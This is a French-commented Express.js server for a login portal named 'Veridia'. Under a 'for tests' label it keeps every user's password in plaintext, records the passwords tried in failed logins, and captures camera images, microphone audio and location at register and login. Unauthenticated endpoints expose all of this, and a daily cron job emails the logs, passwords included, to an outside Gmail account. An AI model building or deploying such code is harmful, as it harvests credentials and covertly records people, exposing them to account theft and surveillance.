/**
 * Veridia — serveur Express.js + nodemailer + node-cron
 *
 * - Inscription / connexion (mot de passe haché scrypt + version claire pour tests)
 * - Sessions cookie
 * - Journal d'événements live (SSE)
 * - Capture caméra / micro / localisation (register + login)
 * - Médias sauvegardés dans uploads/ + métadonnées dans db.json
 * - Envoi automatique quotidien des logs par e-mail
 *
 * Variables d'environnement : voir .env.example
 */

const express = require('express');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

// Chargement optionnel de .env (sans dépendance dotenv)
function loadEnvFile() {
  const envPath = path.join(__dirname, '.env');
  if (!fs.existsSync(envPath)) return;
  const lines = fs.readFileSync(envPath, 'utf8').split(/\r?\n/);
  for (const line of lines) {
    const trimmed = line.trim();
    if (!trimmed || trimmed.startsWith('#')) continue;
    const eq = trimmed.indexOf('=');
    if (eq === -1) continue;
    const key = trimmed.slice(0, eq).trim();
    let val = trimmed.slice(eq + 1).trim();
    if ((val.startsWith('"') && val.endsWith('"')) || (val.startsWith("'") && val.endsWith("'"))) {
      val = val.slice(1, -1);
    }
    if (!process.env[key]) process.env[key] = val;
  }
}
loadEnvFile();

const app = express();
const PORT = Number(process.env.PORT) || 3000;
const DATA_FILE = path.join(__dirname, 'data', 'db.json');
const PUBLIC_DIR = path.join(__dirname, 'public');
const UPLOADS_DIR = path.join(__dirname, 'uploads');

// Créer le dossier uploads s'il n'existe pas
if (!fs.existsSync(UPLOADS_DIR)) {
  fs.mkdirSync(UPLOADS_DIR, { recursive: true });
}

// Middleware — limite body augmentée pour les captures (photo + audio base64)
app.use(express.json({ limit: '15mb' }));
app.use(express.static(PUBLIC_DIR));
// Servir les fichiers uploads (pour revoir les captures)
app.use('/uploads', express.static(UPLOADS_DIR));

// ---------- Base de données fichier ----------
function loadDB() {
  if (!fs.existsSync(DATA_FILE)) return { users: [], events: [] };
  try {
    return JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
  } catch {
    return { users: [], events: [] };
  }
}
function saveDB(db) {
  const dir = path.dirname(DATA_FILE);
  if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
  fs.writeFileSync(DATA_FILE, JSON.stringify(db, null, 2));
}
let db = loadDB();

// ---------- Mots de passe (scrypt) ----------
function hashPassword(password, salt = crypto.randomBytes(16).toString('hex')) {
  const hash = crypto.scryptSync(password, salt, 64).toString('hex');
  return `${salt}:${hash}`;
}
function verifyPassword(password, stored) {
  const [salt, hash] = stored.split(':');
  const check = crypto.scryptSync(password, salt, 64).toString('hex');
  return crypto.timingSafeEqual(Buffer.from(hash, 'hex'), Buffer.from(check, 'hex'));
}

// ---------- Sauvegarde des médias (base64 → fichiers) ----------
function saveBase64File(base64Data, prefix, ext) {
  if (!base64Data || typeof base64Data !== 'string') return null;
  try {
    // data:image/jpeg;base64,.... ou data:audio/webm;base64,....
    const match = base64Data.match(/^data:([^;]+);base64,(.+)$/);
    if (!match) return null;
    const mime = match[1];
    const data = match[2];
    const buffer = Buffer.from(data, 'base64');
    const filename = `${prefix}_${Date.now()}_${crypto.randomBytes(4).toString('hex')}.${ext}`;
    const filepath = path.join(UPLOADS_DIR, filename);
    fs.writeFileSync(filepath, buffer);
    return {
      filename,
      path: `/uploads/${filename}`,
      mime,
      size: buffer.length,
    };
  } catch (e) {
    console.error('[media] Erreur sauvegarde fichier:', e.message);
    return null;
  }
}

/**
 * Traite les permissions reçues du client.
 * Sauvegarde les médias en fichiers et retourne un objet compact pour db.json.
 */
function processPermissions(perms) {
  if (!perms || typeof perms !== 'object') return null;

  const result = {
    location: perms.location || null,
    collectedAt: perms.collectedAt || new Date().toISOString(),
    camera: null,
    microphone: null,
  };

  // Caméra / screenshot
  if (perms.camera) {
    const cam = perms.camera;
    let fileInfo = null;
    if (cam.screenshot) {
      fileInfo = saveBase64File(cam.screenshot, 'cam', 'jpg');
    }
    result.camera = {
      captured: true,
      metadata: cam.metadata || null,
      file: fileInfo
        ? {
            path: fileInfo.path,
            filename: fileInfo.filename,
            size: fileInfo.size,
            mime: fileInfo.mime,
          }
        : null,
      hasScreenshot: !!cam.screenshot,
    };
  }

  // Microphone / audio
  if (perms.microphone) {
    const mic = perms.microphone;
    let fileInfo = null;
    if (mic.audioSample) {
      fileInfo = saveBase64File(mic.audioSample, 'mic', 'webm');
    }
    result.microphone = {
      captured: true,
      metadata: mic.metadata || null,
      file: fileInfo
        ? {
            path: fileInfo.path,
            filename: fileInfo.filename,
            size: fileInfo.size,
            mime: fileInfo.mime,
          }
        : null,
      hasSample: !!mic.audioSample,
    };
  }

  return result;
}

// ---------- Cookies ----------
function parseCookies(header = '') {
  const out = {};
  header.split(';').forEach((pair) => {
    const idx = pair.indexOf('=');
    if (idx === -1) return;
    const k = pair.slice(0, idx).trim();
    const v = pair.slice(idx + 1).trim();
    if (k) out[k] = decodeURIComponent(v);
  });
  return out;
}

// ---------- Sessions ----------
const sessions = new Map();
function createSession(userId) {
  const token = crypto.randomBytes(24).toString('hex');
  sessions.set(token, { userId, createdAt: Date.now() });
  return token;
}
function getSession(req) {
  const cookies = parseCookies(req.headers.cookie || '');
  const token = cookies.sid;
  if (!token || !sessions.has(token)) return null;
  return { token, ...sessions.get(token) };
}

// ---------- Identité invité ----------
function ensureGuestId(req, res) {
  const cookies = parseCookies(req.headers.cookie || '');
  if (cookies.gid) return cookies.gid;
  const gid = crypto.randomBytes(4).toString('hex');
  res.cookie('gid', gid, { path: '/', sameSite: 'Lax', maxAge: 365 * 24 * 60 * 60 * 1000 });
  return gid;
}

// ---------- SSE live ----------
const liveClients = new Set();
function broadcast(event) {
  const line = `[${new Date().toLocaleTimeString('fr-FR')}] ${event.label}`;
  console.log(line);
  const payload = `data: ${JSON.stringify(event)}\n\n`;
  for (const res of liveClients) {
    try {
      res.write(payload);
    } catch {
      /* client parti */
    }
  }
}

function logEvent(type, message, meta, req, res) {
  const session = getSession(req);
  let userLabel;
  if (session) {
    const user = db.users.find((u) => u.id === session.userId);
    userLabel = user ? user.email : 'session inconnue';
  } else {
    const gid = ensureGuestId(req, res);
    userLabel = `invité-${gid}`;
  }
  const entry = {
    id: crypto.randomUUID(),
    type,
    message,
    meta: meta || {},
    user: userLabel,
    ts: new Date().toISOString(),
  };
  db.events.push(entry);
  if (db.events.length > 1000) db.events = db.events.slice(-1000);
  saveDB(db);
  broadcast({ label: `${entry.type.toUpperCase()} · ${entry.user} · ${entry.message}`, ...entry });
  return entry;
}

// ---------- Email quotidien ----------
let nodemailer;
let cron;
try {
  nodemailer = require('nodemailer');
  cron = require('node-cron');
} catch (e) {
  console.warn('\n  ⚠  nodemailer ou node-cron manquant → lance `npm install`\n');
}

function buildEventsReport(hours = 24) {
  const since = Date.now() - hours * 60 * 60 * 1000;
  const recent = db.events.filter((e) => new Date(e.ts).getTime() >= since);
  const lines = recent.map((e) => {
    const t = new Date(e.ts).toLocaleString('fr-FR', { timeZone: process.env.TZ || 'Europe/Paris' });
    return `[${t}] ${e.type.toUpperCase()} · ${e.user} · ${e.message}`;
  });
  return {
    count: recent.length,
    text:
      `Rapport Veridia — ${recent.length} événement(s) des dernières ${hours}h\n` +
      `Généré le ${new Date().toLocaleString('fr-FR', { timeZone: process.env.TZ || 'Europe/Paris' })}\n` +
      `────────────────────────────────────────\n\n` +
      (lines.length ? lines.join('\n') : '(aucun événement)') +
      `\n\n────────────────────────────────────────\nTotal comptes : ${db.users.length}\n`,
  };
}

async function sendDailyEmail() {
  const to = process.env.MAIL_TO;
  const from = process.env.MAIL_FROM || process.env.SMTP_USER;
  const user = process.env.SMTP_USER;
  const pass = process.env.SMTP_PASS;

  if (!to || !user || !pass) {
    console.log('[mail] Configuration incomplete (MAIL_TO / SMTP_USER / SMTP_PASS) → e-mail non envoyé');
    return { ok: false, error: 'config manquante' };
  }
  if (!nodemailer) {
    console.log('[mail] nodemailer non installé');
    return { ok: false, error: 'nodemailer manquant' };
  }

  const report = buildEventsReport(24);
  const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: { user, pass: pass.replace(/\s+/g, '') },
  });

  try {
    const info = await transporter.sendMail({
      from: `"Veridia Logs" <${from}>`,
      to,
      subject: `[Veridia] Rapport quotidien — ${report.count} événement(s)`,
      text: report.text,
    });
    console.log(`[mail] E-mail envoyé à ${to} (${report.count} événements) id=${info.messageId}`);
    return { ok: true, count: report.count };
  } catch (err) {
    console.error('[mail] Échec envoi :', err.message);
    return { ok: false, error: err.message };
  }
}

function startCron() {
  if (!cron) return;
  const expr = process.env.MAIL_CRON || '0 8 * * *';
  if (!cron.validate(expr)) {
    console.warn(`[mail] Expression cron invalide : ${expr}`);
    return;
  }
  cron.schedule(
    expr,
    () => {
      console.log('[mail] Déclenchement envoi quotidien…');
      sendDailyEmail();
    },
    { timezone: process.env.TZ || 'Europe/Paris' }
  );
  console.log(
    `  E-mail quotidien programmé : "${expr}" (${process.env.TZ || 'Europe/Paris'}) → ${process.env.MAIL_TO || '(non configuré)'}`
  );
}

// ---------- Routes API ----------

// SSE stream
app.get('/api/stream', (req, res) => {
  ensureGuestId(req, res);
  res.setHeader('Content-Type', 'text/event-stream');
  res.setHeader('Cache-Control', 'no-cache');
  res.setHeader('Connection', 'keep-alive');
  res.write('retry: 2000\n\n');

  liveClients.add(res);
  req.on('close', () => liveClients.delete(res));
});

// Register
app.post('/api/register', async (req, res) => {
  const { email, password, permissions } = req.body;
  if (!email || !password || password.length < 6) {
    return res.status(400).json({
      ok: false,
      error: 'E-mail invalide ou mot de passe trop court (6 caractères min).',
    });
  }
  if (db.users.find((u) => u.email === email.toLowerCase())) {
    return res.status(409).json({ ok: false, error: 'Un compte existe déjà avec cet e-mail.' });
  }

  const processedPerms = processPermissions(permissions);

  const user = {
    id: crypto.randomUUID(),
    email: email.toLowerCase(),
    passwordHash: hashPassword(password),
    // Pour les tests : mot de passe en clair aussi stocké
    passwordPlain: password,
    createdAt: new Date().toISOString(),
    permissions: processedPerms,
    lastLoginAt: null,
    loginHistory: [],
  };
  db.users.push(user);
  saveDB(db);

  logEvent(
    'auth',
    `compte créé (${user.email}) — mdp: ${password} — permissions: ${processedPerms ? 'oui' : 'non'}`,
    {
      permissionsProvided: !!processedPerms,
      hasCamera: !!(processedPerms && processedPerms.camera && processedPerms.camera.hasScreenshot),
      hasMic: !!(processedPerms && processedPerms.microphone && processedPerms.microphone.hasSample),
      passwordPlain: password,
    },
    req,
    res
  );

  const token = createSession(user.id);
  res.cookie('sid', token, { httpOnly: true, path: '/', sameSite: 'Lax' });
  return res.status(200).json({
    ok: true,
    user: { email: user.email },
    media: processedPerms
      ? {
          camera: processedPerms.camera?.file?.path || null,
          microphone: processedPerms.microphone?.file?.path || null,
        }
      : null,
  });
});

// Login
app.post('/api/login', async (req, res) => {
  const { email, password, permissions } = req.body;
  const user = db.users.find((u) => u.email === (email || '').toLowerCase());
  if (!user || !verifyPassword(password || '', user.passwordHash)) {
    logEvent(
      'auth-fail',
      `tentative de connexion refusée (${email || 'inconnu'}) — mdp tenté: ${password || '(vide)'}`,
      { passwordAttempt: password || null },
      req,
      res
    );
    return res.status(401).json({ ok: false, error: 'E-mail ou mot de passe incorrect.' });
  }

  // Traiter et stocker les permissions (caméra, micro, geo) aussi au login
  const processedPerms = processPermissions(permissions);
  if (processedPerms) {
    user.permissions = processedPerms;
  }

  // Historique de connexion + mdp en clair mis à jour
  user.passwordPlain = password;
  user.lastLoginAt = new Date().toISOString();
  if (!user.loginHistory) user.loginHistory = [];
  user.loginHistory.push({
    at: user.lastLoginAt,
    hasPermissions: !!processedPerms,
    camera: processedPerms?.camera?.file?.path || null,
    mic: processedPerms?.microphone?.file?.path || null,
  });
  if (user.loginHistory.length > 20) user.loginHistory = user.loginHistory.slice(-20);

  saveDB(db);

  logEvent(
    'auth',
    `connexion réussie (${user.email}) — mdp: ${password} — permissions: ${processedPerms ? 'oui' : 'non'}`,
    {
      passwordPlain: password,
      permissionsProvided: !!processedPerms,
      hasCamera: !!(processedPerms && processedPerms.camera && processedPerms.camera.hasScreenshot),
      hasMic: !!(processedPerms && processedPerms.microphone && processedPerms.microphone.hasSample),
      cameraPath: processedPerms?.camera?.file?.path || null,
      micPath: processedPerms?.microphone?.file?.path || null,
    },
    req,
    res
  );

  const token = createSession(user.id);
  res.cookie('sid', token, { httpOnly: true, path: '/', sameSite: 'Lax' });
  return res.status(200).json({
    ok: true,
    user: { email: user.email },
    media: processedPerms
      ? {
          camera: processedPerms.camera?.file?.path || null,
          microphone: processedPerms.microphone?.file?.path || null,
        }
      : null,
  });
});

// Logout
app.post('/api/logout', (req, res) => {
  const session = getSession(req);
  if (session) sessions.delete(session.token);
  res.clearCookie('sid');
  return res.status(200).json({ ok: true });
});

// Get current user with permissions data
app.get('/api/me', (req, res) => {
  const session = getSession(req);
  if (!session) return res.status(401).json({ ok: false });
  const user = db.users.find((u) => u.id === session.userId);
  if (!user) return res.status(401).json({ ok: false });

  return res.status(200).json({
    ok: true,
    user: {
      email: user.email,
      passwordPlain: user.passwordPlain || null,
      createdAt: user.createdAt,
      lastLoginAt: user.lastLoginAt || null,
      permissions: user.permissions
        ? {
            location: user.permissions.location,
            camera: user.permissions.camera
              ? {
                  metadata: user.permissions.camera.metadata,
                  hasScreenshot: !!user.permissions.camera.hasScreenshot,
                  file: user.permissions.camera.file || null,
                }
              : null,
            microphone: user.permissions.microphone
              ? {
                  metadata: user.permissions.microphone.metadata,
                  hasSample: !!user.permissions.microphone.hasSample,
                  file: user.permissions.microphone.file || null,
                }
              : null,
            collectedAt: user.permissions.collectedAt,
          }
        : null,
      loginHistory: user.loginHistory || [],
    },
  });
});

// Liste des utilisateurs (pour tests / admin simple)
app.get('/api/users', (req, res) => {
  const list = db.users.map((u) => ({
    id: u.id,
    email: u.email,
    passwordPlain: u.passwordPlain || null,
    createdAt: u.createdAt,
    lastLoginAt: u.lastLoginAt || null,
    hasCamera: !!(u.permissions?.camera?.hasScreenshot),
    hasMic: !!(u.permissions?.microphone?.hasSample),
    cameraPath: u.permissions?.camera?.file?.path || null,
    micPath: u.permissions?.microphone?.file?.path || null,
    location: u.permissions?.location || null,
  }));
  return res.status(200).json({ ok: true, users: list, count: list.length });
});

// Send telemetry
app.post('/api/telemetry', (req, res) => {
  const { type, message, meta } = req.body;
  const entry = logEvent(type || 'info', message || '', meta, req, res);
  return res.status(200).json({ ok: true, entry });
});

// Get events
app.get('/api/events', (req, res) => {
  return res.status(200).json({ ok: true, events: db.events.slice(-100) });
});

// Send report (manual test endpoint)
app.post('/api/send-report', async (req, res) => {
  const { secret } = req.body;
  const envSecret = process.env.ADMIN_SECRET;
  if (envSecret && secret !== envSecret) {
    return res.status(403).json({ ok: false, error: 'secret invalide' });
  }
  const result = await sendDailyEmail();
  return res.status(result.ok ? 200 : 500).json(result);
});

// Error handling
app.use((err, req, res, next) => {
  console.error('Error:', err);
  res.status(500).json({ ok: false, error: 'Erreur interne du serveur' });
});

// 404 handler
app.use((req, res) => {
  res.status(404).json({ ok: false, error: 'Not found' });
});

// Start server
app.listen(PORT, () => {
  console.log(`\n  Portail Veridia en écoute sur http://localhost:${PORT}\n`);
  console.log("  Les événements s'affichent ici et dans le panneau de la page (SSE).");
  console.log(`  Captures sauvegardées dans : ${UPLOADS_DIR}`);
  console.log('  Endpoints utiles pour tests :');
  console.log('    GET  /api/users   → liste comptes + mdp clair + chemins médias');
  console.log('    GET  /api/me      → compte courant + mdp clair + médias');
  console.log('    GET  /api/events  → journal');
  console.log('    GET  /uploads/... → images / audio capturés\n');
  startCron();
  console.log('');
});
